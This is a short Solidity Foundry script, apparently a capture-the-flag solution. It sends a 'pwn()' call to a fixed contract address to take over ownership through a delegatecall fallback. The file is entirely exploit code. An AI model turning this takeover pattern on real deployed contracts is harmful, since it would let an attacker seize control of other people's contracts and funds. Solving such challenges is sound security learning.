// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract DelegationAttackScript is Script {
    function run() external {
        vm.startBroadcast();

        address instance = 0x7B1afA7354264F5e881eB36054e53eD11a663ce9;

        (bool success, ) = instance.call(abi.encodeWithSignature("pwn()"));
        require(success, "Attack failed");

        vm.stopBroadcast();
    }
}
